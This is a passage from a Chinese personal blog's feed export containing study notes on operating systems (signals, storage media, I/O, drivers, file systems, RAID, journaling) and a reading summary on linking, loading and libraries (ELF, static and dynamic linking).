title="信号（Signal）机制"></a>信号（Signal）机制</h5><p>可以异步的将某个程序打断，并且让程序知道某件事情发生了。</p><ul><li><p>管道（pipe）/ 共享内存（mmap）都是同步的进程间通信机制</p></li><li><p>我们的硬件提供了某个异步的机制，你想到了吗？</p><ul><li>中断！</li></ul></li><li><p>虚拟化：进程是“虚拟计算机”</p></li><li><p>计算机上有</p><ul><li>在事件到来的时候中断处理器</li><li>跳转到处理器预设的中断处理程序</li></ul></li><li><p> 进程上也可以有</p></li><li><p>在事件到来的时候signal进程</p></li><li><p>跳转到处理器预设的signal处理程序</p></li></ul><h5 id="Signal-系统调用：注册信号处理"><a href="#Signal-系统调用：注册信号处理" class="headerlink" title="Signal 系统调用：注册信号处理"></a>Signal 系统调用：注册信号处理</h5><p>为编号为signum的信号设置处理程序handler</p><ul><li>信号的类型：Linux中用man 7 signal查看</li></ul><h5 id="Killx系统调用：-发送信号"><a href="#Killx系统调用：-发送信号" class="headerlink" title="Killx系统调用： 发送信号"></a>Killx系统调用： 发送信号</h5><p>kill -SIGNAME pid</p><ul><li>可以对刚才的handler程序发送SIGINT，SIGQUIT…..</li></ul><h5 id="信号在操作系统上的实现"><a href="#信号在操作系统上的实现" class="headerlink" title="信号在操作系统上的实现"></a>信号在操作系统上的实现</h5><p>..说实话这段没怎么听懂，听了好几遍了，，大概意思可能是中断发生的时候，寄存器和内存的现场都被“封存”在物理内存中。</p><p><strong>接着操作系统“模拟”一次函数调用</strong></p><ul><li>保存寄存器现场</li><li>准备参数，调用注册的signal handler</li><li>恢复寄存器现场，return到程序原先的执行流</li></ul><h5 id="Job-control"><a href="#Job-control" class="headerlink" title="Job control"></a>Job control</h5><p>听不懂…..卒</p><h3 id="Persistence-持久化"><a href="#Persistence-持久化" class="headerlink" title="Persistence(持久化)"></a>Persistence(持久化)</h3><h4 id="持久化的第一课：-存储介质"><a href="#持久化的第一课：-存储介质" class="headerlink" title="持久化的第一课： 存储介质"></a>持久化的第一课： 存储介质</h4><p>为了使数据能够持久的存储，存储设备必须基于物理上容纳数据的介质。</p><ul><li>non-volatility</li></ul><p>存储设备</p><ul><li>逻辑上可以看成一个bit/byte array</li><li>1TB的磁盘 = 1TB个1-byte</li><li>通常支持按块（block）的方式读写</li></ul><hr><p>几个重要的维度：价格，扩展性，速度，可靠性</p><hr><h4 id="磁带"><a href="#磁带" class="headerlink" title="磁带"></a>磁带</h4><p>通过N极或者S极向上来表示一个bit的information（0或1），介质比较稳定，所以information很稳定。  </p><p>优点：</p><ul><li>成本低</li><li>容量大</li></ul><p>缺点：</p><ul><li>存在机械部件</li><li>速度较慢且只能顺序读写  ⇦有没有办法克服呢？</li><li>保存环境苛刻</li></ul><p>应用场景：冷数据的专用备份</p><hr><h4 id="磁鼓"><a href="#磁鼓" class="headerlink" title="磁鼓"></a>磁鼓</h4><p>“并行版”的磁带，把磁带绕城一个圈，放在轴上，这个轴可以让很多圈的磁带，每个磁带有着对应的读写头，轴转的越快，读写速度越快。</p><hr><h4 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h4><p>盘片 + 柱面 + 磁道 + 扇区 = 定位到512字节</p><p>优点：</p><ul><li>成本低</li><li>容量大</li></ul><p>缺点</p><ul><li>随机读写性能下降</li><li>存在机械部件，可靠性一般</li><li>读写头划伤盘片</li></ul><p>应用场景：计算机系统的主力数据存储</p><h5 id="软盘"><a href="#软盘" class="headerlink" title="软盘"></a>软盘</h5><p>…</p><hr><h4 id="光（坑）"><a href="#光（坑）" class="headerlink" title="光（坑）"></a>光（坑）</h4><ul><li><p>挖坑</p><ul><li><p>在完美反射光线的表面上挖出（几乎）不反射 光线的坑</p></li><li><p>激光扫过表面，就能读出坑的信息来（比如：不反射光代表1，反射光代表0）</p><p>其实不是坑，是phase　change晶体（挖坑能量太大）</p></li></ul></li></ul><p>挖坑：优点和缺点</p><ul><li>​    优点：成本极低，容易大量复制、</li><li>缺点：存在机械部件，顺序读取性能尚可，随机读取很慢，可靠性差，<del>挖坑容易填坑难</del>，适合只读的应用场景。</li></ul><p>应用场景：<del>数字产品发行</del>（被互联网挤压的几乎没有生存空间了）</p><h4 id="Flash-Memory"><a href="#Flash-Memory" class="headerlink" title="Flash Memory"></a>Flash Memory</h4><p>通过充电和放电实现</p><p>几乎全是优点：扩展性好，没有机械部件，还便宜。</p><p>但是！一个致命的缺点是放点做不到100%放干净。充放电数千数万次以后，就好像是“充电”状态了。</p><p>再但是！随着软件的进步，SSD逐步取代了HDD，原因就是硬件不够，软件来凑，每个SSD上都运行着管理软件的应用程序</p><p>会管理虚拟块到物理块的映射。</p><h4 id="I-O设备，总线，DMA"><a href="#I-O设备，总线，DMA" class="headerlink" title="I/O设备，总线，DMA"></a>I/O设备，总线，DMA</h4><h5 id="I-O设备"><a href="#I-O设备" class="headerlink" title="I/O设备"></a>I/O设备</h5><p>I/O是沟通计算机和物理世界的桥梁，没有I/O，计算机就只能计算（把内存里的值搬到寄存器，运算，写回）。</p><p>在CPU看来</p><ul><li>I/O设备是一个能与CPU交换数据的接口</li><li>实际上CPU和设备的控制器交互（CPU并不知道图形是如何打印到纸上，像素点是怎么绘制到屏幕上的）<br><img src="/images/io.png"></li></ul><p>CPU如何访问IO设备</p><ul><li>使用in/out指令，访问IO设备的寄存器</li><li>直接执行memory dereference 访问memory-mapped IO设备</li></ul><p>但是处理器只有很少的接口，怎么访问那么多的IO呢？那就是通过总线，将其他的IO先接到总线上。</p><h5 id="总线：一个特殊的I-O设备"><a href="#总线：一个特殊的I-O设备" class="headerlink" title="总线：一个特殊的I/O设备"></a>总线：一个特殊的I/O设备</h5><p>提供“另一个地址空间”和地址空间上的设备访问</p><ul><li>把收到的地址（总线地址）和数据进行转发</li></ul><h5 id="Direct-Memory-Access-DMA"><a href="#Direct-Memory-Access-DMA" class="headerlink" title="Direct Memory Access(DMA)"></a>Direct Memory Access(DMA)</h5><p>在系统里增加一个新的CPU，专门执行“memcpy”程序</p><ul><li>实际实现：直接把DMA控制器连接在总线和内存中<br><img src="/images/%7DMN9H%5B94A3SLPW3XGRCF4LR.png"></li><li>DMA:内存的一致性：硬件维护一致性。</li></ul><h5 id="GPU：既是IO设备，也是处理器"><a href="#GPU：既是IO设备，也是处理器" class="headerlink" title="GPU：既是IO设备，也是处理器"></a>GPU：既是IO设备，也是处理器</h5><p>GPU的功能实际是执行多处理器并行程序（例如OPENGL CUDA）</p><ul><li>将执行结果写入内存（和/或视频输出）</li><li>nvcc：把main编译/链接成ELF；hello编译成GPU指令</li></ul><p>GPU和游戏有什么关系：</p><p>游戏不就是画点么…</p><ul><li>但CPU画不过来啊<ul><li> 几百万个三角形描述形状，tessellation，各种shaders</li><li>我们需要超高性能的并行处理器（GPU）</li></ul></li></ul><p>GPU的内部构造</p><p>非常复杂的异构多处理器系统,是异构的各种各样的，能效比非常高的，执行相对的不是那么通用的指令，并行度非常高，每秒钟执行指令的数量比CPU要高。</p><h4 id="设备的驱动程序"><a href="#设备的驱动程序" class="headerlink" title="设备的驱动程序"></a>设备的驱动程序</h4><h5 id="操作系统应该对I-O设备做什么？"><a href="#操作系统应该对I-O设备做什么？" class="headerlink" title="操作系统应该对I/O设备做什么？"></a>操作系统应该对I/O设备做什么？</h5><p>应用程序有访问I/O设备的需求</p><p>操作系统需要对设备进行<strong>抽象</strong>（虚拟化） </p><hr><p>I/O设备的抽象：对设备（文件描述符）的I（read）和O（write）</p><hr><p>I/O设备虽然复杂，但几乎都可以理解为字节的序列（流或数组）</p><ul><li>（read）从设备某个指定位置读入数据</li><li>（write）向设备某个指定位置写入数据</li><li>（ioctl）读取/设置设备的状态</li></ul><h4 id="操作系统：提供一个硬件抽象层"><a href="#操作系统：提供一个硬件抽象层" class="headerlink" title="操作系统：提供一个硬件抽象层"></a>操作系统：提供一个硬件抽象层</h4><p>操作系统的本质：管理硬件资源，为程序的执行提供服务。</p><p>在OS中建立一个新的抽象层</p><ul><li>以同一个接口访问不同的I/O设备</li><li>实现接口的代码就是设备驱动程序<ul><li> 把对设备的HAL（硬件抽象层）调用翻译成指令</li></ul></li></ul><hr><p>例子：应用使用系统调用访问文件描述符</p><ul><li>文件系统API ⇨ （操作系统代码翻译成）⇨HAL API⇨（设备驱动翻译成）⇨设备指令 &amp; 响应中断</li></ul><h5 id="设备驱动：硬件抽象层的实现"><a href="#设备驱动：硬件抽象层的实现" class="headerlink" title="设备驱动：硬件抽象层的实现"></a>设备驱动：硬件抽象层的实现</h5><p>设备驱动程序：对设备进行一定的管理，对上层提供统一的接口。将设备抽象为一个对象和操作</p><ul><li>以面向对象的方式访问I/O<ul><li>设备：支持read，write，ioctl…功能的对象</li></ul></li></ul><p>设备驱动程序把HAL API调用（read，write，ioctl）翻译成指令</p><hr><p>道理简单，写代码就麻烦了</p><ul><li>I/O设备看起来就是个“黑盒子”</li><li>写错任何代码就是simply “not work”</li></ul><h5 id="Linux设备驱动"><a href="#Linux设备驱动" class="headerlink" title="Linux设备驱动"></a>Linux设备驱动</h5><p>Everything is file (设备也是)</p><ul><li>所以设备提供文件操作就好了！</li></ul><h5 id="两类特殊的设备："><a href="#两类特殊的设备：" class="headerlink" title="两类特殊的设备："></a>两类特殊的设备：</h5><h5 id="磁盘-1"><a href="#磁盘-1" class="headerlink" title="磁盘"></a>磁盘</h5><p>磁盘（存储设备）的访问特性</p><ul><li><p>以数据块（block）为单位访问</p><ul><li> 传输有“最小单元”，不支持随机访问</li></ul></li><li><p>大吞吐量</p><ul><li>使用DMA传输数据</li></ul></li><li><p>应用程序一般不直接访问</p><ul><li>访问者通常是文件系统（维护磁盘上的数据结构）</li><li>大量的并发访问（操作系统中的进程都需要访问文件系统）</li></ul></li></ul><h5 id="Linux-Block-I-O-Layer"><a href="#Linux-Block-I-O-Layer" class="headerlink" title="Linux Block I/O Layer"></a>Linux Block I/O Layer</h5><p>文件系统和磁盘设备之间的接口</p><ul><li>I/O调度器<ul><li>曾经是“电梯”调度增加性能</li><li>现在是CFQ保证公平性</li></ul></li></ul><h5 id="网络设备"><a href="#网络设备" class="headerlink" title="网络设备"></a>网络设备</h5><p>网络的访问特性</p><ul><li>速度非常快</li><li>大小不确定</li><li>延迟敏感</li></ul><h5 id="Linux-net子系统"><a href="#Linux-net子系统" class="headerlink" title="Linux net子系统"></a>Linux net子系统</h5><p>Linux Kernel用独立的子系统（设备抽象和API）管理网络设备</p><h4 id="应用程序眼中的I-O设备"><a href="#应用程序眼中的I-O设备" class="headerlink" title="应用程序眼中的I/O设备"></a>应用程序眼中的I/O设备</h4><h5 id="设备-文件-（后面看不懂了）"><a href="#设备-文件-（后面看不懂了）" class="headerlink" title="设备 = 文件 （后面看不懂了）"></a>设备 = 文件 （<del>后面看不懂了</del>）</h5><h4 id="文件系统：存储设备的虚拟化"><a href="#文件系统：存储设备的虚拟化" class="headerlink" title="文件系统：存储设备的虚拟化"></a>文件系统：存储设备的虚拟化</h4><p>文件系统是<strong>保存在持久存储上的数据结构</strong></p><ul><li>规定了数据在磁盘上的存储方式</li><li>允许对数据结构进行的操作<ul><li>文件/目录系统调用</li></ul></li></ul><p>磁盘（I/O设备）=  一个可以读/写的字节序列</p><p>虚拟磁盘（文件） = 一个可以读/写的动态字节序列</p><p><strong>文件系统的实现 = 数据结构的查询/修改操作</strong></p><h5 id="层次结构的文件系统"><a href="#层次结构的文件系统" class="headerlink" title="层次结构的文件系统"></a>层次结构的文件系统</h5><ul><li>系统中可能有数百万的文件</li><li>key-value的方式不便于人类用户使用</li></ul><p>目录：文件/目录的集合（形成一棵树）</p><ul><li>目录体现了<strong>局部性</strong>：相关的数据存放在相近的目录。</li></ul><h5 id="文件API：修改文件的数据"><a href="#文件API：修改文件的数据" class="headerlink" title="文件API：修改文件的数据"></a>文件API：修改文件的数据</h5><p>​    文件描述符：进程用来访问操作系统对象的“指针”</p><p>​    <strong>mmap</strong>:使用open打开一个文件以后</p><ul><li>用MAO_SHARED将文件映射到地址空间中</li><li>用MAP_PRIVATE创建一个copy-on-write的副本</li></ul><p>通过mmap，可以把进程虚拟空间中的一部分和虚拟磁盘建立关系，对磁盘上的数据访问就变成了对内存的访问。</p><p>映射的长度超过文件大小会发生什么？发生bus error</p><ul><li>ftruncate可以改变文件大小</li></ul><h5 id="文件访问的游标（偏移量）"><a href="#文件访问的游标（偏移量）" class="headerlink" title="文件访问的游标（偏移量）"></a>文件访问的游标（偏移量）</h5><p>文件的读写自带“游标”，这样就不用每次都指定写到哪里了</p><p>可以用<strong>lseek</strong>和<strong>ftell</strong>系统调用来改变/获取游标的位置</p><p>偏移量管理：</p><p>文件描述符在fork时会被子进程继承</p><h5 id="目录-文件系统API"><a href="#目录-文件系统API" class="headerlink" title="目录/文件系统API"></a>目录/文件系统API</h5><p>目录管理：创建/删除：</p><ul><li><p>mkdir</p><ul><li>可以创建一个目录</li><li>可以设置访问权限</li></ul></li><li><p>rmdir</p><ul><li>删除一个空目录</li><li>没有“递归删除”的系统调用</li><li>（应用层能实现的，就不要在OS层实现）</li><li>rm -rf会遍历目录，逐个删除</li></ul></li></ul><h5 id="硬（hard）链接"><a href="#硬（hard）链接" class="headerlink" title="硬（hard）链接"></a>硬（hard）链接</h5><p>​    允许一个文件被多个目录引用</p><ul><li>目录中仅存指向文件数据的指针</li><li>不能链接目录</li><li>不能跨文件系统</li></ul><p>​    小知识：其实所有的文件都是硬链接（删除文件使用unlink系统调用）</p><ul><li>引用计数减一，减到0时数据被回收</li></ul><h5 id="软（symbolic）链接"><a href="#软（symbolic）链接" class="headerlink" title="软（symbolic）链接"></a>软（symbolic）链接</h5><p>软链接：在文件里存储一个“跳转提示”</p><ul><li><p>软链接也是一个文件</p><ul><li>当引用这个文件时，去找另一个文件</li><li>另一个文件的绝对/相对路径以文本的形式存储在文件中</li><li>可以跨文件系统，可以链接目录</li></ul></li><li><p>允许多层链接</p><ul><li>a⇨b⇨c</li></ul></li><li><p>可以创建软链接的硬链接</p><ul><li>因为软链接也是文件</li></ul></li><li><p>OS在处理软链接时会执行路径解析</p></li></ul><h4 id="FAT文件系统"><a href="#FAT文件系统" class="headerlink" title="FAT文件系统"></a>FAT文件系统</h4><p>需求</p><ul><li>树状的目录结构</li><li>系统中以小文件为主</li><li>无需支持链接操作</li></ul><p>实现方式</p><ul><li>链表<ul><li>任何复杂的高级数据结构都显得浪费</li></ul></li></ul><h5 id="用链表存储数据：两种设计"><a href="#用链表存储数据：两种设计" class="headerlink" title="用链表存储数据：两种设计"></a>用链表存储数据：两种设计</h5><ul><li><p>在每个数据块后放置指针</p><ul><li>优点：实现简单，无需单独开辟空间</li><li>缺点：数据的大小不是2^k,单独的lseek需要读整块数据</li></ul></li><li><p>将指针集中存放在文件系统的某个区域</p><ul><li>优点：局部性好，lseek更快</li><li>缺点：集中存放的数据损坏将导致数据丢失（解决办法:先备份一份）</li></ul></li></ul><h5 id="File-Allocation-Table"><a href="#File-Allocation-Table" class="headerlink" title="File Allocation Table"></a>File Allocation Table</h5><ul><li><p>把磁盘分成“cluster”</p><ul><li>文件系统头部BPB(BIOS Parameter Block)标记了cluster的大小</li></ul></li><li><p>在一段区域里（FAT）连续存放指针</p></li></ul><h4 id="目录树实现：目录文件"><a href="#目录树实现：目录文件" class="headerlink" title="目录树实现：目录文件"></a>目录树实现：目录文件</h4><p>目录 = 文件/目录的集合</p><ul><li>它本身也是一个数据结构</li><li>文件名到文件信息的映射</li></ul><h4 id="FAT-性能与可靠性"><a href="#FAT-性能与可靠性" class="headerlink" title="FAT:性能与可靠性"></a>FAT:性能与可靠性</h4><p>性能</p><ul><li>小文件简直太适合了</li><li>大文件的随机访问就不行了</li></ul><p>可靠性</p><ul><li>维护若干个FAT的副本防止元数据损坏</li><li>损坏的cluster在FAT中标记</li></ul><h4 id="EXT2-UNIX-文件系统"><a href="#EXT2-UNIX-文件系统" class="headerlink" title="EXT2/UNIX 文件系统"></a>EXT2/UNIX 文件系统</h4><ol><li>集中存储文件的元数据</li><li>大小文件可以用不同的方式处理</li></ol><h5 id="ext2目录文件"><a href="#ext2目录文件" class="headerlink" title="ext2目录文件"></a>ext2目录文件</h5><p>与FAT本质相同：在文件上建目录的数据结构</p><h5 id="性能与可靠性"><a href="#性能与可靠性" class="headerlink" title="性能与可靠性"></a>性能与可靠性</h5><p>大文件的随机读写性能明显提升</p><ul><li>支持链接</li><li>inode在磁盘上连续存储，便于缓存/预取</li><li>依然有碎片问题</li></ul><p>但可靠性依然是一个很大的问题</p><h4 id="持久数据的可靠性"><a href="#持久数据的可靠性" class="headerlink" title="持久数据的可靠性"></a>持久数据的可靠性</h4><h5 id="两种简单的Fault-Model"><a href="#两种简单的Fault-Model" class="headerlink" title="两种简单的Fault Model"></a>两种简单的Fault Model</h5><ul><li><p>random data corruption</p><ul><li>数据损坏</li></ul></li><li><p>fail-stop</p><ul><li>磁盘好像就“忽然消失了“</li></ul></li></ul><p>以上两种情况都假设能立即检测出问题</p><h5 id="Random-data-corruption"><a href="#Random-data-corruption" class="headerlink" title="Random data corruption"></a>Random data corruption</h5><h5 id="FAT文件系统中一个cluster损坏的几种情况"><a href="#FAT文件系统中一个cluster损坏的几种情况" class="headerlink" title="FAT文件系统中一个cluster损坏的几种情况"></a>FAT文件系统中一个cluster损坏的几种情况</h5><ul><li><p>元数据损坏(FAT) ←高破坏性</p><ul><li>碎片的文件（以当时的技术）彻底无法恢复</li><li>顺序存储的文件</li></ul></li><li><p>系统文件损坏</p><ul><li>可能无法进入系统</li><li>但重新安装系统即可无缝修复</li></ul></li><li><p>数据文件丢失</p><ul><li>丢失一个文件</li><li>勉强可以接受（重要的文件手工备份）</li></ul></li></ul><h5 id="应对部分数据损坏"><a href="#应对部分数据损坏" class="headerlink" title="应对部分数据损坏"></a>应对部分数据损坏</h5><p>自动备份最重要的数据（FAT）* K</p><ul><li>K由文件系统初始化（格式化；mkfs）时设置</li></ul><h5 id="FAT-K-性能分析"><a href="#FAT-K-性能分析" class="headerlink" title="FAT * K 性能分析"></a>FAT * K 性能分析</h5><p>典型操作</p><ul><li><p>FAT读取</p><ul><li>从FAT-1照常读取</li></ul></li><li><p>FAT-i 损坏（磁盘I/O会返回失败）</p><ul><li>从FAT-( i + 1)读取</li></ul></li><li><p>FAT更新</p><ul><li>需要同时写入FAT-1,FAT-2…..FAT-K<ul><li>FAT更新的速度降低为1/K;</li><li>等等–FAT时在内存中缓存的（写入频率非常低，使用的是wirie back法）</li></ul></li></ul></li></ul><h5 id="Fail-Stop"><a href="#Fail-Stop" class="headerlink" title="Fail Stop"></a>Fail Stop</h5><p>RAID (Redundant Array of Inexpensive Disks)</p><ul><li>把多个（不可靠的）磁盘虚拟成一块非常可靠的虚拟磁盘</li></ul><h5 id="怎样用不可靠的磁盘构造更可靠的磁盘"><a href="#怎样用不可靠的磁盘构造更可靠的磁盘" class="headerlink" title="怎样用不可靠的磁盘构造更可靠的磁盘"></a>怎样用不可靠的磁盘构造更可靠的磁盘</h5><ul><li><p>通过设备驱动程序抽象成“一个硬盘”V</p><ul><li>实际上：两块磁盘A,B上的数据构成“镜像”</li></ul></li><li><p>read(V,blk)</p><ul><li>可以从A或B中的任意一个读取</li></ul></li><li><p>write(V,blk)</p><ul><li>将同样的数据写入A，B的同一位置</li></ul></li></ul><h4 id="崩溃一致性"><a href="#崩溃一致性" class="headerlink" title="崩溃一致性"></a>崩溃一致性</h4><h5 id="导致崩溃一致性的原因"><a href="#导致崩溃一致性的原因" class="headerlink" title="导致崩溃一致性的原因"></a>导致崩溃一致性的原因</h5><p>数据结构的维护需要多个数据块的写入  </p><p>考虑文件追加写的三个writes</p><ul><li>【1】文件的inode（size，索引） 【2】data bitmap 【3】data block </li></ul><h5 id="崩溃恢复：FSCK-（-File-System-Checking）"><a href="#崩溃恢复：FSCK-（-File-System-Checking）" class="headerlink" title="崩溃恢复：FSCK （ File System Checking）"></a>崩溃恢复：FSCK （ File System Checking）</h5><p>FSCK:根据磁盘上已有的信息，恢复出最可能的数据结构</p><p>恢复规则：例子</p><ul><li>检查inode标记的数据块是否bitmap都标记为“1”</li><li>检查inode数据是否”看起来合法“，否则删除</li><li>检查是否存在dangling link<ul><li>没有链接的inode被移到 lost+found 目录中</li></ul></li></ul><p>如果fsck的时候发生崩溃，文件系统可能进入彻底无法恢复的状态</p><h5 id="Journaling（日志）"><a href="#Journaling（日志）" class="headerlink" title="Journaling（日志）"></a>Journaling（日志）</h5><p>flush机制：只有在flush之前的请求落盘之后，才会开始flush之后的请求<br><img src="/images/jour.png"></p><h4 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h4><ul><li><p>Android系统上的应用程序</p><ul><li>开发门槛低（Java/Kotlin）<ul><li>对比死掉的Symbian：要么是C++，要么是阉割的 JAVA</li></ul></li><li>代码编译成Dalvik bytecode,APP打包成“apk”(zip archive)<ul><li>aptool 可以实现“解包”</li></ul></li></ul></li><li><p>运行在“Android Runtime” (ART)</p><ul><li> managed runtime</li><li>丰富的系统服务，运行库</li></ul></li></ul><p>Android Apps</p><p>每个app都是一个Linux进程</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>链接，装载和库</title>
    <link href="/2021/07/13/link-load-lib/"/>
    <url>/2021/07/13/link-load-lib/</url>
    
    <content type="html"><![CDATA[<h5 id="前段时间在看的一本书，比较详细的讲了程序的链接，装载等过程。在此写下一篇读书笔记。"><a href="#前段时间在看的一本书，比较详细的讲了程序的链接，装载等过程。在此写下一篇读书笔记。" class="headerlink" title="前段时间在看的一本书，比较详细的讲了程序的链接，装载等过程。在此写下一篇读书笔记。"></a>前段时间在看的一本书，比较详细的讲了程序的链接，装载等过程。在此写下一篇读书笔记。</h5><p>​    首先，操作系统做了什么：OS的一个功能是提供抽象的接口，另外一个功能是管理硬件资源。</p><p>​    所有的程序都以进程（Process）的方式运行在比OS权限更低的级别，每个进程有独立的地址空间，每个进程间的地址空间相互隔离。CPU由OS统一分配。进程根据优先级的不同，会有机会得到CPU，但是如果某个进程的运行时间超过一定范围，OS会停止该进程，将CPU分配给其他进程。这种方式称为抢占式。 （关于OS的笔记我会在另外一篇文章中详细的叙述。这里就不过多叙述）</p><h5 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h5><p>​    一个程序的运行一般分为四个步骤：预处理，编译，汇编，链接。</p><p>​    编译的过程一般分为六步：扫描，语法分析，语义分析，源代码优化，代码生成和目标代码优化。</p><p>​    现代软件设计追求模块化。而静态链接就是把不同模块组装在一起，把不同模块相互引用的部分处理好，主要有三个步骤：地址和空间分配，符号决议，重定位。    </p><p>​    编译器编译后但是还未链接的文件叫做目标文件（.o文件），这种文件的格式和可执行文件的格式很相似，一般采用同种格式存储。PC平台流行两种可执行文件，一种是Windows下的PE（Portable Executable）格式，另外一种是Linux下的ELF（Executable Linkable Format）。</p><p>​    ELF文件将信息按照段的形式存储，ELF文件开头是一个“Header”,描述的是整个文件的属性，例如文件是否可执行，是静态链接还是动态链接等，文件头还包括一个段表 ，段表是文件中描述各个段的数组，比如描述了各个段在文件中的偏移位置以及一些属性，文件头之后跟的就是各个段的内容，编译后的机器指令放在.code或者也叫.text段里，全局变量和局部静态变量放在.data段，值得注意的是，已经初始化的全局变量和局部静态变量保存在.data段，而未初始化的全局变量和局部静态变量保存在.bss段，但是.bss段只是为这些未初始化的变量预留位置，并没有内容，所以在文件中也不占空间。我们可以在Linux中用readelf命令来查看ELF文件。<br><img src="/images/image-20210713133815842.png"></p><p>​     7F 45 4C 46是ELF文件专属的魔数，此外文件头还定义了文件机器字节长度，数据额存储方式，版本，运行平台等。</p><p>​    目标文件中会有.rel.xxxx.的段，就是上文所述的重定位表（Relocation Table），如果目标文件中有需要重定位的部分，这些重定位的信心就记录在重定位表中。</p><p>​    链接的本质就是把多个不同的目标文件相互“粘”在一起，在链接中，目标文件的相互缝合,实际上就是目标文件之间对地址的引用，即，对函数和变量地址的引用。在链接中，每个函数和变量都有自己独特的名字，我们统称为符号（Symbol），函数名或者变量名就是符号名。符号就是链接中的粘合剂，链接过程就是基于符号才能完成，每个目标文件都会有一个符号表，表里面记录了目标文件中所有用到的符号，每个符号有一个对应的值叫做符号值，对于变量和函数来说，符号值就是他们的地址。为了防止函数名称冲突，引入了函数签名，函数签名包含了函数的信息，例如函数名，函数的参数类型，所在的命名空间（namespace），在编译器和链接器处理符号时，就会采用某种名称修饰的办法，使得每个函数签名都对应一个修饰后的名称。</p><h5 id="静态连接"><a href="#静态连接" class="headerlink" title="静态连接"></a>静态连接</h5><p>​    链接的第一个阶段，空间与地址分配，链接器在将不同的目标文件合并的时候，会将相似段合并到一起。使用这种链接方法的链接器一般都采用两部链接的方法。第一步 空间与地址分配。第二部 符号解析与重定位。在连接过程中，所有目标文件中的符号会被收集起来，组成一个全局符号表。符号解析的过程就需要到全局符号表中去查找相关的符号。</p><p>​    一个程序之所以有用是因为有输入和输出。想要实现输入和输出，最简单的办法就是调用操作系统API，例如printf在Linux下就是调用write。Windows下就是调用writeconsole。</p><p>​    一个静态库可以看作是一组目标文件的集合，即很多目标文件经过压缩打包后的一个文件。Linux中常用的C语言静态库的就是libc。</p><h5 id="装载与进程"><a href="#装载与进程" class="headerlink" title="装载与进程"></a>装载与进程</h5><h6 id="虚拟空间"><a href="#虚拟空间" class="headerlink" title="虚拟空间"></a>虚拟空间</h6><p>每个进程都有自己的虚拟地址空间，而虚拟空间的大小是由硬件决定的。32位平台下的虚拟地址空间大小就是0x00000000~0xFFFFFFFF，就是4GB。但是4GB大小的虚拟地址空间不是都可以用的，Linux下1GB是操作系统本身需要的另外3GB是留给进程使用的，对于Windows下，是2GB留给OS，2GB留给进程，但是可以通过配置，就可以和Linux下一样。</p><h6 id="装载："><a href="#装载：" class="headerlink" title="装载："></a>装载：</h6><p>​    程序执行时需要的指令和数据必须在内存中才能正常运行，最简单的办法就是需要的全部装进去，但是很浪费内存，解决办法就是程序的局部性原理，将常用的部分驻留在内存中，不常用的就放在磁盘上。</p><p>​    两种典型的动态装载办法：覆盖装入和页映射。</p><p>​    覆盖装入已经基本被淘汰了，因为它需要程序员来编写代码这些模块什么时候装进去，什么时候被替换掉。</p><p>​    页映射是虚拟存储的一部分，简单来说就是将内存和磁盘中的数据和指令按照“页”为单位进行分割，需要哪个装哪个，如果有冲突，按照FIFO或者LRU算法进行替换即可。</p><h6 id="从OS角度来看可执行文件的装载"><a href="#从OS角度来看可执行文件的装载" class="headerlink" title="从OS角度来看可执行文件的装载"></a>从OS角度来看可执行文件的装载</h6><p>​    创建一个进程，然后装载相应的可执行文件并且执行。需要做三件事：1.创建一个独立的虚拟地址空间，2.读取可执行文件头，建立虚拟空间和可执行文件的映射关系，3将CPU的指令寄存器设置成可执行文件的入口地址，启动运行。</p><p>​    第一步是建立虚拟空间和物理空间之前的映射关系，第二部是建立虚拟空间到可执行文件的映射关系。</p><h5 id="动态链接："><a href="#动态链接：" class="headerlink" title="动态链接："></a>动态链接：</h5><p>​    静态连接的缺点有很多，比如浪费磁盘和内存的空间，程序的开发和发布也不方便。</p><p>​    要解决上述问题最简单的办法就是将模块互相分割开来，形成独立的文件，而不是静态的链接在一起。简单的来说，就是不对那些组成程序的目标文件进行链接，而是等到程序运行时才进行链接，也就是说，把链接过程推迟到了运行时再进行。动态链接的一个优点就是程序可以在运行时，动态的选择加载各种程序模块，这个优点可以被用来制作插件（Plug-in）。但是缺点就是如果某个模块更新后接口不兼容的话就导致程序无法运行了。这个问题也叫DDL Hell。</p><p>​    Linux下ELF动态链接文件被称为动态共享对象（DSO,Dynamic Shared Objects）一般是以“.so”为扩展名的一些文件。在Windows中，动态链接文件被叫做动态链接库，“.dll”为扩展名的文件。</p><p>​    共享对象在装载时在虚拟地址空间中的位置非常麻烦。共享对象在编译时不能假设自己在虚拟空间中的位置，为了让共享对象能够在任意地址装载，应用了装载时重定位的办法。静态链接中的重定位叫做链接时重定位。</p><p>​    装载时重定位又引发了一个问题，就是指令部分无法共享，解决办法就是把指令中需要修改的部分分离出来和    数据部分装在一起，数据部分可以在每个进程中都有一个副本，这种方案叫做PIC(position independent code)。</p><p>​    链接的时候没必要把所有功能模块链接到一起，用到的时候才进行绑定，这种方法叫做延迟绑定，可以提升速度。</p><h5 id="库相关"><a href="#库相关" class="headerlink" title="库相关"></a>库相关</h5><p>​    首先要知道应用程序在使用的内存空间中有如下默认区域：堆 ，栈，可执行文件映像，保留区。</p><p>栈：维护函数调用的上下文，且经典OS中栈总是向下增长的，sp指针永远指向栈顶，栈一般保存了函数的返回地址和参数，临时变量，保存的上下文。I386中一个函数的活动记录用ebp和esp来划定范围。</p><p>堆：动态分配内存，比如malloc函数。Linux下的进程堆管理稍微有些复杂，因为它提供了两个系统调用brk(),和mmap()。Windows下进程堆管理时用其提供的一个API叫做VirtualAlloc(),用来向系统申请空间。大小要求是页的整数倍。</p><p>可执行文件映像：存储着可执行文件在内存中的映像。</p><p>保留区：并不是一个单一的内存区域。而是内存 中受保护而禁止访问的内存区域总称。一般极小的地址都是不允许访问的比如 NULL，所以通常将C语言中无效指针赋值为NULL也是出于这个考虑。0地址正常情况下不可能有有效的可访问数据。</p><p>​    程序并不是从main开始执行，在这之前需要经历一个很复杂的过程。进行一系列初始化等。</p><p>​    现代OS一般有两种特权级别，分别为用户和内核模式，一般通过中断从用户模式切换到内核模式。中断有两个属性，一个是中断号，一个是中断处理程序。内核中存在一个数组叫做中断向量表，包含着指向第N号中断处理程序的指针。中断到来时，CPU会停止执行代码，根据中断的中断号，在中断向量表中查询对应的中断处理程序。</p><p>以上。</p>]]></content>
    
    
    <categories>
      
      <category>链接，装载和库</category>
      
